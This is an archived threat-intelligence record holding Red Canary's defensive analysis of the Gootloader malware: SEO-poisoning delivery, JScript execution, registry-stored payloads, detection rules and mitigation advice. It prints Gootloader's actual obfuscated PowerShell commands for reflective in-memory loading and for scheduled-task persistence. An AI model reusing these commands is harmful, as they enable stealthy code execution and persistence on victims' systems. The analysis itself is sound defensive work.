{
    "id": "4fe2f2a5-5a5e-4271-bc9d-64dad421d41e",
    "created_at": "2023-01-12T15:10:57.412464Z",
    "updated_at": "2025-03-27T02:09:18.846582Z",
    "deleted_at": null,
    "sha1_hash": "f75804aee3539b799268fce8f50335eba0a730ce",
    "title": "2022-05-12 - The Goot cause- Detecting Gootloader and its follow-on activity",
    "authors": "",
    "file_creation_date": "2022-05-28T05:07:22Z",
    "file_modification_date": "2022-05-28T05:07:22Z",
    "file_size": 258183,
    "plain_text": "# See what it's like to have a partner in the fight.\n\n**redcanary.com/blog/gootloader**\n\nOver the past several years, Red Canary has routinely detected activity involving a threat\nknown as Gootloader: malware that can deliver additional payloads, siphon data from\n[victims, and stealthily persist in a compromised environment. Gootloader was originally](https://securityintelligence.com/gootkit-bobbing-and-weaving-to-avoid-prying-eyes/)\ndelivered via spam campaigns and older exploit kits. We’ve increasingly observed\nGootloader operators using search engine optimization (SEO) poisoning tactics to gain\naccess to victims’ environments and initiate multi-pronged intrusions involving follow-on\n[payloads such as Cobalt Strike and](https://redcanary.com/threat-detection-report/threats/cobalt-strike/) [Gootkit.](https://redcanary.com/threat-detection-report/threats/gootkit/)\n\nGootloader specifically represents a significant threat to enterprise environments because it\nis designed to deliver additional malware. We included it as a highlighted threat in our 2022\nThreat Detection Report, and it boasts a regular presence in our monthly top 10 rankings for\n[Intelligence Insights. Despite the high volume of Gootloader infections, there is relatively](https://redcanary.com/blog/intelligence-insights-april-2022/)\nlittle reporting available on complete intrusion chains.\n\n## Distinguishing Gootloader from Gootkit\n\nWe historically referred to both Gootloader and Gootkit under the same name of “Gootkit,”\nbut after realizing others in the community tracked these as different threats, we decided to\ndo the same. Separating the initial delivery and loader distinctly from the payload also\nallows us to better track variations in follow-on activity. We decided to impose an analytic\n\n\n-----\n\nboundary (see below for the full intrusion chain) between Gootloader and Gootkit after the\nexecution of the .NET DLL module commonly observed in intrusion chains involving these\n[threats. This division is consistent with parameters outlined by researchers from Kaspersky](https://securelist.com/gootkit-the-cautious-trojan/102731/)\nand allows us to account for variations in activity observed after Gootloader more precisely.\nThough Gootkit may be a follow-on payload, we’ve also observed other activity following\nGootloader infections, including Cobalt Strike beacons and the Osiris banking trojan.\n\nBelow you’ll find our analysis on Gootloader, the most prolific piece of the intrusion chain,\nand its capabilities. We’re also including a graphic to highlight the boundary between\n[Gootloader and its following payloads, along with supplemental malware analysis.](http://redcanary.com/gootloader)\n\n## Initial access\n\nGootloader operators compromise legitimate infrastructure, such as WordPress blogs, and\nseed those sites with common keywords. Operators then use SEO techniques in an attempt\nto direct anyone entering those keywords into a search engine to a site that lures users to\n[download a ZIP file containing the initial Gootloader script. Previous work from Sophos and](https://news.sophos.com/en-us/2021/08/12/gootloaders-mothership-controls-malicious-content/)\nother organizations covers this aspect of Gootloader in great detail. From our own\ninvestigations, we’ve discovered trends relating to possible search terms that lead users to\nGootloader. It’s not clear if operators are specifically targeting individuals in specific\nfunctions across specific organizations, or if they cast a more opportunistic net, using\ncommon terms that potential victims may be more likely to seek out on their own.\n\nThe majority of the Gootloader campaigns we’ve observed involved initial malicious ZIP\nfiles containing the word “agreement” in the file name. We can identify victims’ search\nqueries based on the name of the malicious ZIP file that contains the Gootloader script. The\nmalicious ZIP name is usually the user’s search query terms joined by dashes. For\nexample, if a user searched for “mortgage subordination agreement,” the downloaded ZIP\nwould be named `mortgage_subordination_agreement.zip .`\n\n\n-----\n\n_Figure 1: Gootloader intrusion chain_\n\n## Execution\n\nThe first stage of Gootloader on the endpoint is a JScript file extracted from a ZIP file and\nexecuted via `wscript.exe . While these JScript files have been a common Gootloader`\nentry point since December 2020, the scripts changed around October 2021 to masquerade\nas legitimate jQuery JavaScript library files. To achieve this masquerading, the adversary\ncreates scripts by mixing malicious Gootloader code with benign jQuery library code,\nproducing a file around 296KB in size.\n\nGootloader queries the value of the `USERDNSDOMAIN environment variable, which is a`\nsimple check to determine if the affected host is part of an Active Directory domain. This\nmeans that the malware specifically targets business or enterprise victims that use Active\n\n\n-----\n\nDirectory. On systems where the check passes, Gootloader pulls down an additional JScript\nstage that executes in the same `wscript.exe process. That stage contains two`\nembedded payloads: a .NET DLL component and a Cobalt Strike beacon or other malware\ncomponent. During execution, these two payloads are written into Windows Registry keys\nto enable persistence.\n\n## Persistence\n\nOnce these payloads are distributed into registry keys, the script executes two PowerShell\ncommands. The first retrieves the .NET DLL from the Windows Registry, reflectively loads it,\nand executes a function within the DLL named “Test()”.\n```\nsleep -s 83;$opj=Get-ItemProperty -path\n(\"hk\"+\"cu:\\sof\"+\"tw\"+\"are\\mic\"+\"ros\"+\"oft\\Phone\\\"+[Environment]::\n(\"use\"+\"rn\"+\"ame\")+\"0\");for ($uo=0;$uo -le 760;$uo++)\n{Try{$mpd+=$opj.$uo}Catch{}};$uo=0;while($true){$uo++;$ko=[math]::(\"sq\"+\"rt\")\n($uo);if($ko -eq 1000){break}}$yl=$mpd.replace(\"#\",$ko);$kjb=[byte[]]::(\"ne\"+\"w\")\n($yl.Length/2);for($uo=0;$uo -lt $yl.Length;$uo+=2){$kjb[$uo/2]=[convert]::\n(\"ToB\"+\"yte\")($yl.Substring($uo,2),(2*8))}[reflection.assembly]::(\"Lo\"+\"ad\")($kjb);\n[Open]::(\"Te\"+\"st\")();\n\n```\n[The second PowerShell command establishes persistence via a scheduled task using a](https://redcanary.com/threat-detection-report/techniques/scheduled-task/)\ncombination of cmdlets. The execution of the .NET DLL module is one of the main\ndifferentiators between traditional Gootkit and the initial Gootloader.\n```\n$a=\"[Base64 code]...\";$u=$env:USERNAME;Register-ScheduledTask $u -In (NewScheduledTask -Ac (New-ScheduledTaskAction -E\n([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) -Ar (\"-w h -e\n\"+$a)) -Tr (New-ScheduledTaskTrigger -AtL -U $u));\n\n## Follow-on payload\n\n```\nIn the .NET DLL module, the adversary implements code to pull an obfuscated payload\n(such as Cobalt Strike) from a Windows Registry key, remove the obfuscation, and then\nexecute its contents. The decoding part is fairly straightforward, using text replacement to\nshield the malware from cursory inspection. Follow-on payloads vary and have included\nCobalt Strike, Gootkit, and Osiris. In the event Cobalt Strike is the follow-on payload, see\nour [malware analysis for more details.](https://redcanary.com/wp-content/uploads/2022/05/Gootloader.pdf)\n\nRed Canary recommends detecting Gootloader activity to catch this threat early in the\nintrusion chain. See below for opportunities to identify Gootloader or follow-on activity in\nyour environment\n\n\n-----\n\n### Detection opportunity: Windows Script Host ( wscript.exe ) executing content from a user’s AppData folder\n\nThis detection opportunity identifies the Windows Script Host, `wscript.exe, executing a`\nJScript file from the user’s AppData folder. This works well to detect instances where a user\nhas double-clicked into a Gootloader ZIP file and then double-clicked on the JScript script to\nexecute it.\n\nprocess == ( wscript.exe )\n\n&&\nprocess_command_line_includes == `appdata\\*.js`\n\n### Detection opportunity: PowerShell ( powershell.exe ) performing a reflective load of a .NET assembly\n\nThis detection opportunity identifies PowerShell loading a .NET assembly into memory for\nexecution using the `System.Reflection capabilities of the .NET Framework. This detects`\nPowerShell loading the .NET component of Gootloader and multiple additional threats in the\nwild.\n\nprocess == ( powershell.exe )\n\n&&\nprocess_command_line_includes == `Reflection.Assembly AND` `Load AND` `byte[]`\n\n### Detection opportunity: Rundll32 ( rundll32.exe ) with no command-line arguments\n\nThis detection opportunity identifies `rundll32.exe executing with no command-line`\narguments as an injection target like we usually see for Cobalt Strike beacon injection. The\nbeacon distributed by Gootloader in this instance used `rundll32.exe, as do many other`\nbeacons found in the wild.\n\nprocess == `rundll32.exe`\n\n&&\ncommand_line_includes (“”)*\n\n&&\nhas_network_connection\n\n||\n\nhas_child_process\n\n_*Note: “” indicates a blank command line._\n\n\n-----\n\n## Mitigation advice\n\nYou can prevent Gootloader from executing by changing the default file association for\nJScript files on your Windows systems. Consider using a Group Policy Object to associate\nJScript files with `notepad.exe instead of` `wscript.exe . This will make the malicious`\nscripts open in Notepad when a victim double-clicks on the file. For successful execution,\nthe victim would have to manually issue a `wscript.exe command instead.`\n\nAdditionally, a little bit of education can help mitigate Gootloader. In all of the instances we\nobserved, victims were seeking legal agreement documents via Google searches.\nDocumenting safe places to obtain legal documents can help prevent users from\ndownloading potentially malicious files.\n\nMALWARE ANALYSIS\n\n[We analyzed a Gootloader sample with a Cobalt Strike follow-on payload.](http://redcanary.com/gootloader)\n\nRelated Articles\n\nDetection and response\n\n### ChromeLoader: a pushy malvertiser\n\nDetection and response\n\n### Intelligence Insights: May 2022\n\nDetection and response\n\n### Marshmallows & Kerberoasting\n\nDetection and response\n\n### Raspberry Robin gets the worm early\n\n**Subscribe to our blog**\n\nOur website uses cookies to provide you with a better browsing experience. More\n[information can be found in our Privacy Policy.](https://redcanary.com/privacy-policy)\n\nX\n\n\n-----\n\n**Privacy Overview**\n\nThis website uses cookies to improve your experience while you navigate through the\nwebsite. Out of these cookies, the cookies that are categorized as necessary are stored on\nyour browser as they are essential for the working of basic functionalities of the website. We\nalso use third-party cookies that help us analyze and understand how you use this website.\nThese cookies will be stored in your browser only with your consent. You also have the\noption to opt-out of these cookies. But opting out of some of these cookies may have an\neffect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category\nonly includes cookies that ensures basic functionalities and security features of the website.\nThese cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used\nspecifically to collect user personal data via analytics, ads, other embedded contents are\ntermed as non-necessary cookies. It is mandatory to procure user consent prior to running\nthese cookies on your website.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-12 - The Goot cause- Detecting Gootloader and its follow-on activity.pdf"
    ],
    "report_names": [
        "2022-05-12 - The Goot cause- Detecting Gootloader and its follow-on activity.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536257,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653714442,
    "ts_modification_date": 1653714442,
    "files": {
        "pdf": "https://archive.orkl.eu/f75804aee3539b799268fce8f50335eba0a730ce.pdf",
        "text": "https://archive.orkl.eu/f75804aee3539b799268fce8f50335eba0a730ce.txt",
        "img": "https://archive.orkl.eu/f75804aee3539b799268fce8f50335eba0a730ce.jpg"
    }
}